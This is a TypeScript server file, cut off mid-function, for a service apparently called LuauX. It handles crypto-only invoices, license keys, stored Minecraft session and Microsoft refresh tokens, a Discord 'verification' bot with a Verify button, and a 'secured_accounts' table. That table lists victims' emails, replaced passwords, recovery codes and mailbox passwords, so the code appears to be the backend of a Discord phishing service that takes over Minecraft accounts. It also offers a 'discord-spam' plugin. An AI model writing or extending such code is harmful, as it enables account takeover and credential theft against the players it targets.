import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

export const getMyProfile = createServerFn({ method: "GET" }).handler(async () => {
  const { getSessionUser, getSessionData, admin, ensureProfile } =
    await import("./luaux-server.server");
  const user = await getSessionUser();
  if (!user) return { profile: null, plan: null };
  await ensureProfile(user);
  const db = admin();
  const { data: profile } = await db
    .from("profiles")
    .select("*")
    .eq("discord_id", user.id)
    .maybeSingle();
  let plan = null;
  if (profile?.active_plan_id) {
    const { data: p } = await db
      .from("plans")
      .select("*")
      .eq("id", profile.active_plan_id)
      .maybeSingle();
    plan = p;
  }
  const { profileHasMcAccess } = await import("./plan-grant.server");
  // Paid hours OR unexpired plan count as access (hours packs no longer look "forgotten")
  const active = profileHasMcAccess(profile);
  const { isAdminSession } = await import("./luaux-server.server");
  const isAdmin = await isAdminSession();
  // Admin UI bypass only — never invent a paid plan for display
  return { profile, plan, active: active || isAdmin, isAdmin };
});

export const getPlans = createServerFn({ method: "GET" }).handler(async () => {
  const { admin } = await import("./luaux-server.server");
  const { data } = await admin().from("plans").select("*").order("sort_order");
  // No plan advertises "all plugins" — strip that claim server-side
  return (data ?? []).map((plan) => {
    const features = Array.isArray(plan.features)
      ? (plan.features as string[]).filter((f) => !/all plugins/i.test(String(f)))
      : plan.features;
    return { ...plan, features };
  });
});

export const getMcAccounts = createServerFn({ method: "GET" }).handler(async () => {
  const { requireUser, admin } = await import("./luaux-server.server");
  const user = await requireUser();
  const db = admin();
  let rows: Array<Record<string, unknown>> = [];
  {
    const { data, error } = await db
      .from("mc_accounts")
      .select(
        "id,label,auth_type,username,uuid,status,created_at,ssid,refresh_token,last_refreshed_at,token_expires_at",
      )
      .eq("discord_id", user.id)
      .order("created_at", { ascending: false });
    if (error && /refresh_token|column/i.test(error.message)) {
      const { data: legacy } = await db
        .from("mc_accounts")
        .select("id,label,auth_type,username,uuid,status,created_at,ssid")
        .eq("discord_id", user.id)
        .order("created_at", { ascending: false });
      rows = (legacy ?? []) as Array<Record<string, unknown>>;
    } else {
      rows = (data ?? []) as Array<Record<string, unknown>>;
    }
  }
  // Never send raw secrets to the browser — only boolean flags
  return rows.map((row) => {
    const { ssid, refresh_token, ...rest } = row as typeof row & {
      ssid?: string | null;
      refresh_token?: string | null;
    };
    return {
      ...rest,
      has_ssid: !!(ssid && String(ssid).trim().length > 0),
      has_refresh_token: !!(refresh_token && String(refresh_token).trim().length > 0),
    };
  });
});

/** Preview SSID without saving — returns IGN + UUID for UI confirmation */
export const previewMcSsid = createServerFn({ method: "POST" })
  .inputValidator((input) => z.object({ ssid: z.string().min(1).max(4000) }).parse(input))
  .handler(async ({ data }) => {
    const { requireUser } = await import("./luaux-server.server");
    const user = await requireUser();
    const { rateLimit } = await import("./rate-limit.server");
    const rl = rateLimit(`ssid-preview:${user.id}`, 20, 60_000);
    if (!rl.ok) throw new Error(`Too many previews — retry in ${rl.retryAfterSec}s`);
    const { validateMinecraftSsid } = await import("./mc-ssid.server");
    const result = await validateMinecraftSsid(data.ssid);
    if (!result.ok) throw new Error(result.error);
    return {
      username: result.profile.name,
      uuid: result.uuidDashed,
      rawUuid: result.profile.id,
    };
  });

export const addMcAccount = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        label: z.string().min(1).max(60),
        auth_type: z.enum(["microsoft", "ssid", "offline"]),
        username: z.string().max(60).optional().nullable(),
        uuid: z.string().max(60).optional().nullable(),
        ssid: z.string().max(4000).optional().nullable(),
        /** Optional MSA refresh_token — enables automatic session keep-alive */
        refresh_token: z.string().max(4000).optional().nullable(),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const { rateLimit } = await import("./rate-limit.server");
    const rl = rateLimit(`ssid-add:${user.id}`, 15, 60_000);
    if (!rl.ok) throw new Error(`Too many account adds — retry in ${rl.retryAfterSec}s`);

    let username = data.username?.trim() || null;
    let uuid = data.uuid?.trim() || null;
    let ssid: string | null = null;
    let refreshToken: string | null = null;
    let tokenExpiresAt: string | null = null;

    let authType = data.auth_type;

    const { normalizeRefreshToken, looksLikeRefreshToken, ensureFreshMcAccessToken } =
      await import("./mc-refresh.server");
    if (data.refresh_token?.trim()) {
      const rt = normalizeRefreshToken(data.refresh_token);
      if (!looksLikeRefreshToken(rt)) {
        throw new Error("refresh_token looks invalid — paste the full Microsoft refresh token");
      }
      refreshToken = rt;
    }

    // Microsoft device-code: save account without SSID; worker shows link/code on launch
    if (data.auth_type === "microsoft" && !data.ssid?.trim() && !refreshToken) {
      authType = "microsoft";
      username = data.username?.trim() || data.label?.trim() || null;
      if (!username) {
        throw new Error("Label or Microsoft email/username required for device-code accounts");
      }
    } else if (
      data.auth_type === "ssid" ||
      (data.auth_type === "microsoft" && (data.ssid?.trim() || refreshToken))
    ) {
      // SSID path (or Microsoft with pasted token/refresh → store as ssid)
      if (data.ssid?.trim() || refreshToken) {
        const ensured = await ensureFreshMcAccessToken({
          ssid: data.ssid || null,
          refreshToken,
        });
        if (!ensured.ok) throw new Error(ensured.error);
        ssid = ensured.token;
        username = ensured.profile.name;
        uuid = ensured.uuidDashed;
        authType = "ssid";
        if (ensured.refreshToken) refreshToken = ensured.refreshToken;
        if (ensured.expiresInSec) {
          tokenExpiresAt = new Date(Date.now() + ensured.expiresInSec * 1000).toISOString();
        }
      } else if (data.auth_type === "ssid") {
        throw new Error("Minecraft access_token (SSID) required");
      }
    }

    if (authType === "offline" && !username) {
      throw new Error("Username required for offline accounts");
    }

    // Prefer label from IGN for SSID if user left generic label
    const label =
      authType === "ssid" && (!data.label || data.label === "alt-1")
        ? username || data.label
        : data.label;

    const insertRow: Record<string, unknown> = {
      discord_id: user.id,
      label,
      auth_type: authType,
      username,
      uuid,
      ssid,
      status: "idle",
    };
    if (refreshToken) {
      insertRow.refresh_token = refreshToken;
      insertRow.last_refreshed_at = new Date().toISOString();
      if (tokenExpiresAt) insertRow.token_expires_at = tokenExpiresAt;
    }

    const { data: row, error } = await admin()
      .from("mc_accounts")
      .insert(insertRow)
      .select("id,label,auth_type,username,uuid,status,created_at")
      .single();
    if (error) {
      if (/refresh_token|column/i.test(error.message) && refreshToken) {
        // Migration not applied yet — store SSID only
        const { data: fallback, error: fbErr } = await admin()
          .from("mc_accounts")
          .insert({
            discord_id: user.id,
            label,
            auth_type: authType,
            username,
            uuid,
            ssid,
            status: "idle",
          })
          .select("id,label,auth_type,username,uuid,status,created_at")
          .single();
        if (fbErr) throw new Error(fbErr.message);
        return fallback;
      }
      throw new Error(error.message);
    }
    return row;
  });

/** Replace SSID on an existing account (token refresh without re-create) */
export const refreshMcSsid = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        id: z.string().uuid(),
        ssid: z.string().max(4000).optional().nullable(),
        /** Optional MSA refresh_token — enables automatic session keep-alive */
        refresh_token: z.string().max(4000).optional().nullable(),
      })
      .refine((v) => !!(v.ssid?.trim() || v.refresh_token?.trim()), {
        message: "Provide access_token (SSID) and/or refresh_token",
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const { rateLimit } = await import("./rate-limit.server");
    const rl = rateLimit(`ssid-refresh:${user.id}`, 20, 60_000);
    if (!rl.ok) throw new Error(`Too many token refreshes — retry in ${rl.retryAfterSec}s`);

    const {
      normalizeRefreshToken,
      looksLikeRefreshToken,
      ensureFreshMcAccessToken,
    } = await import("./mc-refresh.server");

    let refreshToken: string | null = null;
    if (data.refresh_token?.trim()) {
      const rt = normalizeRefreshToken(data.refresh_token);
      if (!looksLikeRefreshToken(rt)) {
        throw new Error("refresh_token looks invalid — paste the full Microsoft refresh token");
      }
      refreshToken = rt;
    }

    // Keep existing refresh_token if user only pastes a new SSID
    if (!refreshToken) {
      const { data: existing } = await admin()
        .from("mc_accounts")
        .select("refresh_token")
        .eq("id", data.id)
        .eq("discord_id", user.id)
        .maybeSingle();
      if (typeof existing?.refresh_token === "string" && existing.refresh_token.trim()) {
        refreshToken = existing.refresh_token;
      }
    }

    const ensured = await ensureFreshMcAccessToken({
      accountId: data.id,
      ssid: data.ssid || null,
      refreshToken,
    });
    if (!ensured.ok) throw new Error(ensured.error);

    const patch: Record<string, unknown> = {
      auth_type: "ssid",
      ssid: ensured.token,
      username: ensured.profile.name,
      uuid: ensured.uuidDashed,
      status: "idle",
    };
    if (ensured.refreshed || data.refresh_token?.trim()) {
      if (ensured.refreshToken) patch.refresh_token = ensured.refreshToken;
      else if (refreshToken) patch.refresh_token = refreshToken;
      patch.last_refreshed_at = new Date().toISOString();
      if (ensured.expiresInSec) {
        patch.token_expires_at = new Date(Date.now() + ensured.expiresInSec * 1000).toISOString();
      }
    }

    const { data: row, error } = await admin()
      .from("mc_accounts")
      .update(patch)
      .eq("id", data.id)
      .eq("discord_id", user.id)
      .select("id,label,auth_type,username,uuid,status")
      .maybeSingle();

    if (error) {
      if (/refresh_token|column/i.test(error.message)) {
        const { data: fb, error: fbErr } = await admin()
          .from("mc_accounts")
          .update({
            auth_type: "ssid",
            ssid: ensured.token,
            username: ensured.profile.name,
            uuid: ensured.uuidDashed,
            status: "idle",
          })
          .eq("id", data.id)
          .eq("discord_id", user.id)
          .select("id,label,auth_type,username,uuid,status")
          .maybeSingle();
        if (fbErr) throw new Error(fbErr.message);
        if (!fb) throw new Error("Account not found");
        return fb;
      }
      throw new Error(error.message);
    }
    if (!row) throw new Error("Account not found");
    return row;
  });

export const deleteMcAccount = createServerFn({ method: "POST" })
  .inputValidator((input) => z.object({ id: z.string().uuid() }).parse(input))
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const db = admin();

    // Stop any live jobs for this account before delete (prevents orphan sockets)
    const { data: liveJobs } = await db
      .from("bot_jobs")
      .select("id, config, status")
      .eq("discord_id", user.id)
      .eq("type", "mc")
      .in("status", ["pending", "running", "stopping", "paused"]);
    const toStop = (liveJobs || []).filter((j) => {
      const cfg = (j.config || {}) as { accountId?: string };
      return cfg.accountId === data.id;
    });
    if (toStop.length > 0) {
      await db
        .from("bot_jobs")
        .update({ status: "stopped", error: "Account deleted" })
        .in(
          "id",
          toStop.map((j) => j.id),
        );
    }

    const { error } = await db
      .from("mc_accounts")
      .delete()
      .eq("id", data.id)
      .eq("discord_id", user.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

const SUPPORTED_CURRENCIES = ["ltc", "sol"] as const;

type NowPaymentsCreateResponse = {
  payment_id?: string | number;
  payment_status?: string;
  pay_address?: string;
  pay_amount?: number | string;
  pay_currency?: string;
  price_amount?: number | string;
  price_currency?: string;
  order_id?: string;
  purchase_id?: string | number;
  network?: string;
  message?: string;
  status?: boolean;
  code?: string;
};

async function createNowPaymentsInvoice(opts: {
  priceUsd: number;
  payCurrency: "ltc" | "sol";
  orderId: string;
  description: string;
}): Promise<{
  paymentId: string;
  payAddress: string;
  payAmount: number;
  payCurrency: string;
  status: string;
}> {
  const { envStr } = await import("./luaux-server.server");
  const apiKey = envStr("NOWPAYMENTS_API_KEY");
  if (!apiKey) {
    throw new Error(
      "NOWPAYMENTS_API_KEY is not set. Add it in Vercel env / .env to create invoices.",
    );
  }

  // Prefer explicit IPN URL, then SITE_URL / VERCEL_URL (custom domain / Vercel)
  const siteBase =
    envStr("SITE_URL").replace(/\/$/, "") ||
    (process.env.VERCEL_PROJECT_PRODUCTION_URL
      ? `https://${String(process.env.VERCEL_PROJECT_PRODUCTION_URL).replace(/^https?:\/\//, "")}`
      : "") ||
    (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : "") ||
    "https://luaux.wtf";
  const ipn = envStr("IPN_CALLBACK_URL") || `${siteBase}/api/public/nowpayments/webhook`;

  const res = await fetch("https://api.nowpayments.io/v1/payment", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-api-key": apiKey,
    },
    body: JSON.stringify({
      price_amount: opts.priceUsd,
      price_currency: "usd",
      pay_currency: opts.payCurrency,
      order_id: opts.orderId,
      order_description: opts.description.slice(0, 200),
      ipn_callback_url: ipn,
      is_fixed_rate: false,
      is_fee_paid_by_user: false,
    }),
    signal: AbortSignal.timeout(20_000),
  });

  const raw = await res.text();
  let data: NowPaymentsCreateResponse = {};
  try {
    data = JSON.parse(raw) as NowPaymentsCreateResponse;
  } catch {
    throw new Error(`NOWPayments bad response (HTTP ${res.status})`);
  }

  if (!res.ok) {
    const msg =
      data.message ||
      (typeof data === "object" && "error" in data
        ? String((data as { error?: string }).error)
        : "") ||
      raw.slice(0, 200) ||
      `HTTP ${res.status}`;
    throw new Error(`NOWPayments error: ${msg}`);
  }

  const paymentId = data.payment_id != null ? String(data.payment_id) : "";
  const payAddress = (data.pay_address || "").trim();
  const payAmount = Number(data.pay_amount);
  if (!paymentId || !payAddress || !(payAmount > 0)) {
    throw new Error("NOWPayments returned incomplete invoice (missing address/amount)");
  }

  return {
    paymentId,
    payAddress,
    payAmount,
    payCurrency: (data.pay_currency || opts.payCurrency).toLowerCase(),
    status: (data.payment_status || "waiting").toLowerCase(),
  };
}

export const createInvoice = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        plan_id: z.string().min(1),
        pay_currency: z.enum(SUPPORTED_CURRENCIES),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin, ensureProfile, isAdminSession } = await import("./luaux-server.server");
    const user = await requireUser();
    const { rateLimit } = await import("./rate-limit.server");
    const invRl = rateLimit(`invoice:${user.id}`, 8, 10 * 60_000);
    if (!invRl.ok) {
      throw new Error(`Too many invoices — retry in ${invRl.retryAfterSec}s`);
    }
    await ensureProfile(user);
    const db = admin();
    const isAdm = await isAdminSession();
    const { data: plan } = await db.from("plans").select("*").eq("id", data.plan_id).maybeSingle();
    if (!plan) throw new Error("Unknown plan");

    // Verification Bot is under work — block all public purchases
    const planId = String(plan.id || "");
    const planKind = String((plan as { kind?: string }).kind || "");
    if (
      planId === "verification" ||
      planId.startsWith("verification") ||
      planKind === "verification" ||
      /verification/i.test(String(plan.name || ""))
    ) {
      throw new Error("Verification Bot is under work and cannot be purchased right now.");
    }

    const order_id = `luaux_${user.id}_${Date.now()}`;

    // Admin bypass: insert payment then shared fulfill (keys / hours / webhooks)
    if (isAdm) {
      const { data: row, error: adminPayErr } = await db
        .from("payments")
        .insert({
          discord_id: user.id,
          plan_id: plan.id,
          np_payment_id: `admin_${Date.now()}`,
          np_order_id: order_id,
          pay_currency: "admin",
          pay_amount: 0,
          pay_address: "admin",
          price_amount: 0,
          status: "finished",
          confirmations: 999,
          required_confirmations: 1,
        })
        .select("id")
        .single();
      if (adminPayErr || !row) throw new Error(adminPayErr?.message || "Admin payment insert failed");

      const { fulfillPayment } = await import("./payment-fulfill.server");
      await fulfillPayment(db, row.id, {
        confirmations: 999,
        raw: { source: "admin_invoice" },
      });

      return {
        id: row.id,
        pay_address: "admin",
        pay_amount: 0,
        pay_currency: "admin",
        price_amount: 0,
        status: "finished",
        confirmations: 999,
        required_confirmations: 1,
      };
    }

    // NOWPayments invoice (LTC / SOL only) — rates + unique deposit address from NP
    const pay_currency = data.pay_currency;
    const price_amount = Number(plan.price_usd);
    if (!(price_amount > 0)) throw new Error("Invalid plan price");

    const np = await createNowPaymentsInvoice({
      priceUsd: price_amount,
      payCurrency: pay_currency,
      orderId: order_id,
      description: `LuauX ${plan.name || plan.id}`,
    });

    const { data: row, error } = await db
      .from("payments")
      .insert({
        discord_id: user.id,
        plan_id: plan.id,
        np_payment_id: np.paymentId,
        np_order_id: order_id,
        pay_currency: np.payCurrency || pay_currency,
        pay_amount: np.payAmount,
        pay_address: np.payAddress,
        price_amount,
        status: np.status || "waiting",
        confirmations: 0,
        required_confirmations: 2,
      })
      .select("id")
      .single();
    if (error) throw new Error(error.message);

    return {
      id: row.id,
      pay_address: np.payAddress,
      pay_amount: np.payAmount,
      pay_currency: np.payCurrency || pay_currency,
      price_amount,
      status: np.status || "waiting",
      confirmations: 0,
      required_confirmations: 2,
    };
  });

export const getPayment = createServerFn({ method: "GET" })
  .inputValidator((input) => z.object({ id: z.string().uuid() }).parse(input))
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const { data: row } = await admin()
      .from("payments")
      .select(
        "id,plan_id,pay_currency,pay_amount,pay_address,price_amount,status,confirmations,required_confirmations,fulfilled_at,created_at",
      )
      .eq("id", data.id)
      .eq("discord_id", user.id)
      .maybeSingle();
    return row;
  });

export const listPayments = createServerFn({ method: "GET" }).handler(async () => {
  const { requireUser, admin } = await import("./luaux-server.server");
  const user = await requireUser();
  const { data } = await admin()
    .from("payments")
    .select(
      "id,plan_id,pay_currency,price_amount,status,confirmations,required_confirmations,created_at",
    )
    .eq("discord_id", user.id)
    .order("created_at", { ascending: false })
    .limit(20);
  return data ?? [];
});

export const getVerificationKeys = createServerFn({ method: "GET" }).handler(async () => {
  const { requireUser, admin } = await import("./luaux-server.server");
  const user = await requireUser();
  const { data } = await admin()
    .from("verification_keys")
    .select("id, key, expires_at, created_at, delivered")
    .eq("discord_id", user.id)
    .order("created_at", { ascending: false })
    .limit(10);
  return data ?? [];
});

export const getPluginKeys = createServerFn({ method: "GET" })
  .inputValidator((d: unknown) => {
    const o = d as { plugin_id?: string };
    if (!o?.plugin_id) throw new Error("plugin_id required");
    return { plugin_id: String(o.plugin_id) };
  })
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const { data: rows } = await admin()
      .from("verification_keys")
      .select("id, key, expires_at, created_at, delivered, plugin_id")
      .eq("discord_id", user.id)
      .eq("plugin_id", data.plugin_id)
      .order("created_at", { ascending: false })
      .limit(10);
    return rows ?? [];
  });

export const getVerificationSettings = createServerFn({ method: "GET" }).handler(async () => {
  const { requireUser, admin } = await import("./luaux-server.server");
  const user = await requireUser();
  const { data } = await admin()
    .from("verification_settings")
    .select(
      "discord_id, guild_id, verified_role_id, channel_id, message_title, message_description, button_text, bot_public_key, last_message_id, bot_token",
    )
    .eq("discord_id", user.id)
    .maybeSingle();
  if (!data) return null;
  const hasToken = typeof data.bot_token === "string" && data.bot_token.trim().length > 20;
  const { bot_token: _t, ...rest } = data as Record<string, unknown> & { bot_token?: string | null };
  return { ...rest, has_bot_token: hasToken, bot_token: hasToken ? "••••••••" : "" };
});

export const getSecuredAccounts = createServerFn({ method: "GET" }).handler(async () => {
  const { requireUser, admin } = await import("./luaux-server.server");
  const user = await requireUser();
  const { data, error } = await admin()
    .from("secured_accounts")
    .select(
      "id, discord_id, mc_username, mc_email, new_email, new_password, new_recovery_code, mailbox_email, mailbox_password, mailbox_provider, mailbox_imap_host, mc_method, mc_capes, secured_at, guild_id, session_id",
    )
    .eq("discord_id", user.id)
    .order("secured_at", { ascending: false })
    .limit(50);
  if (error) {
    // Older schema without mailbox_* columns
    const { data: fallback } = await admin()
      .from("secured_accounts")
      .select("*")
      .eq("discord_id", user.id)
      .order("secured_at", { ascending: false })
      .limit(50);
    return (fallback ?? []).map((row) => ({
      ...row,
      mailbox_email: (row as { mailbox_email?: string }).mailbox_email || (row as { new_email?: string }).new_email || null,
      mailbox_password: (row as { mailbox_password?: string }).mailbox_password || null,
    }));
  }
  return (data ?? []).map((row) => ({
    ...row,
    mailbox_email: row.mailbox_email || row.new_email || null,
  }));
});

export const saveVerificationSettings = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        guild_id: z.string().min(1),
        verified_role_id: z.string().min(1),
        channel_id: z.string().min(1),
        message_title: z.string().min(1).max(100),
        message_description: z.string().min(1).max(2000),
        button_text: z.string().min(1).max(50),
        bot_token: z.string().max(200).optional().default(""),
        // Optional — we auto-fetch verify_key from Discord when possible
        bot_public_key: z.string().max(128).optional().default(""),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
    const user = await requireUser();
    const db = admin();

    const { data: keys } = await db
      .from("verification_keys")
      .select("id, expires_at")
      .eq("discord_id", user.id)
      .eq("plugin_id", "verification")
      .order("created_at", { ascending: false })
      .limit(1);

    const activeKey = keys?.find((k) => new Date(k.expires_at).getTime() > Date.now());
    const isAdmin = await isAdminSession();
    if (!activeKey && !isAdmin) {
      throw new Error("No active Verification Bot license — purchase or redeem a key first");
    }

    let botTokenToUse = data.bot_token.trim();
    // Masked placeholder or empty → keep existing token on file
    if (!botTokenToUse || botTokenToUse.includes("•") || botTokenToUse.length < 20) {
      const { data: existing } = await db
        .from("verification_settings")
        .select("bot_token")
        .eq("discord_id", user.id)
        .maybeSingle();
      const prev = typeof existing?.bot_token === "string" ? existing.bot_token.trim() : "";
      if (prev.length >= 20) botTokenToUse = prev;
      else throw new Error("Bot Token is required");
    }
    let botPublicKey = (data.bot_public_key || "")
      .replace(/\s+/g, "")
      .replace(/^0x/i, "")
      .trim()
      .toLowerCase();

    const guildId = data.guild_id.trim();
    const channelId = data.channel_id.trim();
    const roleId = data.verified_role_id.trim();

    // Verify token + auto-fetch Public Key (verify_key) from Discord API
    const meRes = await fetch("https://discord.com/api/v10/users/@me", {
      headers: { Authorization: `Bot ${botTokenToUse}` },
    });
    if (!meRes.ok) {
      throw new Error("Invalid bot token — check you copied the Bot Token from Developer Portal");
    }

    const appRes = await fetch("https://discord.com/api/v10/oauth2/applications/@me", {
      headers: { Authorization: `Bot ${botTokenToUse}` },
    });
    if (appRes.ok) {
      const app = (await appRes.json()) as { verify_key?: string; id?: string };
      if (app.verify_key && /^[0-9a-fA-F]{64}$/.test(app.verify_key)) {
        botPublicKey = app.verify_key.toLowerCase();
      }
    }
    if (!/^[0-9a-f]{64}$/.test(botPublicKey)) {
      throw new Error(
        "Could not load bot Public Key from Discord. Paste the 64-char Public Key from Developer Portal → General Information.",
      );
    }

    const guildRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}`, {
      headers: { Authorization: `Bot ${botTokenToUse}` },
    });
    if (!guildRes.ok) {
      throw new Error(
        "Your bot is not in that server. Invite your bot first (OAuth2 URL Generator: bot + applications.commands), then try again.",
      );
    }

    const chRes = await fetch(`https://discord.com/api/v10/channels/${channelId}`, {
      headers: { Authorization: `Bot ${botTokenToUse}` },
    });
    if (!chRes.ok) {
      throw new Error(
        "Cannot access that channel. Check Channel ID and give the bot View Channel + Send Messages.",
      );
    }

    // Load previous post so we replace instead of stacking duplicates
    const { data: existing } = await db
      .from("verification_settings")
      .select("last_message_id, channel_id")
      .eq("discord_id", user.id)
      .maybeSingle();

    if (existing?.last_message_id && existing?.channel_id) {
      try {
        await fetch(
          `https://discord.com/api/v10/channels/${existing.channel_id}/messages/${existing.last_message_id}`,
          {
            method: "DELETE",
            headers: { Authorization: `Bot ${botTokenToUse}` },
          },
        );
      } catch {
        /* old message may already be gone */
      }
    }

    const channelRes = await fetch(
      `https://discord.com/api/v10/channels/${channelId}/messages`,
      {
        method: "POST",
        headers: {
          Authorization: `Bot ${botTokenToUse}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          embeds: [
            {
              title: data.message_title,
              description: data.message_description,
              color: 5814783,
            },
          ],
          components: [
            {
              type: 1,
              components: [
                {
                  type: 2,
                  style: 3,
                  label: data.button_text,
                  custom_id: "verify_member",
                },
              ],
            },
          ],
        }),
      },
    );

    if (!channelRes.ok) {
      const text = await channelRes.text();
      console.error("[verification] post message failed:", channelRes.status, text);
      throw new Error(
        `Could not post the Verify button (${channelRes.status}). Give the bot Send Messages + Embed Links in that channel.`,
      );
    }

    const posted = (await channelRes.json().catch(() => null)) as { id?: string } | null;
    const lastMessageId = posted?.id || null;

    const { error } = await db.from("verification_settings").upsert(
      {
        discord_id: user.id,
        guild_id: guildId,
        verified_role_id: roleId,
        channel_id: channelId,
        message_title: data.message_title,
        message_description: data.message_description,
        button_text: data.button_text,
        bot_token: botTokenToUse,
        bot_public_key: botPublicKey.toLowerCase(),
        last_message_id: lastMessageId,
      },
      { onConflict: "discord_id" },
    );

    if (error) {
      // Columns missing (last_message_id / bot_*) — still try without last_message_id
      if (/last_message_id|bot_token|bot_public_key|column/i.test(error.message)) {
        const { error: e2 } = await db.from("verification_settings").upsert(
          {
            discord_id: user.id,
            guild_id: guildId,
            verified_role_id: roleId,
            channel_id: channelId,
            message_title: data.message_title,
            message_description: data.message_description,
            button_text: data.button_text,
            bot_token: botTokenToUse,
            bot_public_key: botPublicKey.toLowerCase(),
          },
          { onConflict: "discord_id" },
        );
        if (e2) {
          throw new Error(
            `${e2.message}. Run SQL: ADD COLUMN bot_token, bot_public_key, last_message_id on verification_settings`,
          );
        }
      } else {
        throw new Error(error.message);
      }
    }

    return { ok: true };
  });

/** Public invite URL for the central LuauX verification bot */
export const getVerificationBotInvite = createServerFn({ method: "GET" }).handler(async () => {
  const { envStr } = await import("./luaux-server.server");
  const clientId = envStr("DISCORD_CLIENT_ID");
  // Manage Roles, View Channels, Send Messages, Embed Links, Use App Commands, Read Message History
  const permissions = "268561408";
  const invite = clientId
    ? `https://discord.com/api/oauth2/authorize?client_id=${clientId}&permissions=${permissions}&scope=bot%20applications.commands`
    : "";
  return {
    invite,
    clientId,
    hasCentralBot: !!(envStr("DISCORD_BOT_TOKEN") && envStr("DISCORD_PUBLIC_KEY")),
  };
});

export const resendKey = createServerFn({ method: "POST" })
  .inputValidator((input) => {
    const o = input as { key_id?: string };
    if (!o?.key_id) throw new Error("key_id required");
    return { key_id: String(o.key_id) };
  })
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const db = admin();

    const { data: keyRow } = await db
      .from("verification_keys")
      .select("id, key, expires_at, discord_id, plugin_id, delivered")
      .eq("id", data.key_id)
      .eq("discord_id", user.id)
      .maybeSingle();

    if (!keyRow) throw new Error("Key not found");

    const LABELS: Record<string, string> = {
      verification: "Verification Bot",
      "discord-spam": "Discord Spam",
      "discord-autoreply": "Discord Auto-Reply",
    };
    const label = LABELS[keyRow.plugin_id] ?? keyRow.plugin_id;
    const { envStr } = await import("./luaux-server.server");
    const botToken = envStr("DISCORD_BOT_TOKEN");
    if (!botToken) throw new Error("Discord bot is not configured");

    const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
      method: "POST",
      headers: {
        Authorization: `Bot ${botToken}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ recipient_id: user.id }),
    });

    if (!dmRes.ok) {
      throw new Error("Could not open DM. Please open a DM with the LuauX bot first and try again.");
    }

    const dm = (await dmRes.json()) as { id: string };
    const isLifetime = new Date(keyRow.expires_at).getTime() - Date.now() > 365 * 24 * 60 * 60 * 1000;

    await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
      method: "POST",
      headers: {
        Authorization: `Bot ${botToken}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content:
          `🔑 **LuauX ${label} — License Key**\n\n` +
          `Your ${isLifetime ? "lifetime" : "monthly"} license key:\n\`\`\`${keyRow.key}\`\`\`\n` +
          (isLifetime
            ? `This key never expires.\n\n`
            : `Expires: <t:${Math.floor(new Date(keyRow.expires_at).getTime() / 1000)}:F>\n\n`) +
          `Keep this key private.`,
      }),
    });

    await db
      .from("verification_keys")
      .update({ delivered: true })
      .eq("id", keyRow.id);

    return { ok: true };
  });

export const revokeKey = createServerFn({ method: "POST" })
  .inputValidator((input) => {
    const o = input as { key_id?: string };
    if (!o?.key_id) throw new Error("key_id required");
    return { key_id: String(o.key_id) };
  })
  .handler(async ({ data }) => {
    const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
    await requireUser();
    const isAdm = await isAdminSession();
    if (!isAdm) throw new Error("Admin only");
    const db = admin();

    const { error } = await db
      .from("verification_keys")
      .update({ expires_at: new Date().toISOString() })
      .eq("id", data.key_id);

    if (error) throw new Error(error.message);
    return { ok: true };
  });

const UNASSIGNED_OWNER = "UNASSIGNED";

/** User: redeem a license key (gift / support / purchase DM) */
export const redeemLicenseKey = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        key: z.string().min(8).max(80),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const db = admin();

    const normalized = data.key.trim().toUpperCase().replace(/\s+/g, "");

    // Exact match first (keys stored uppercase), then case-insensitive fallback
    let keyRow: {
      id: string;
      key: string;
      discord_id: string;
      plugin_id: string;
      expires_at: string;
    } | null = null;

    const { data: exact } = await db
      .from("verification_keys")
      .select("id, key, discord_id, plugin_id, expires_at")
      .eq("key", normalized)
      .maybeSingle();
    keyRow = exact;

    if (!keyRow) {
      const { data: recent, error: listErr } = await db
        .from("verification_keys")
        .select("id, key, discord_id, plugin_id, expires_at")
        .order("created_at", { ascending: false })
        .limit(500);
      if (listErr) throw new Error(listErr.message);
      keyRow =
        (recent || []).find(
          (k) => String(k.key).toUpperCase().replace(/\s+/g, "") === normalized,
        ) ?? null;
    }

    if (!keyRow) throw new Error("Invalid key — check and try again");

    if (new Date(keyRow.expires_at).getTime() <= Date.now()) {
      throw new Error("This key has expired");
    }

    const owner = String(keyRow.discord_id || "");
    const unassigned =
      !owner ||
      owner === UNASSIGNED_OWNER ||
      owner === "PENDING" ||
      owner === "0";

    if (owner === user.id) {
      return {
        ok: true,
        already: true,
        plugin_id: keyRow.plugin_id,
        key: keyRow.key,
        expires_at: keyRow.expires_at,
      };
    }

    if (!unassigned) {
      throw new Error(
        "This key is already linked to another Discord account. Contact support if you believe this is a mistake.",
      );
    }

    // Atomic claim: only if still unassigned
    const { data: claimed, error: claimErr } = await db
      .from("verification_keys")
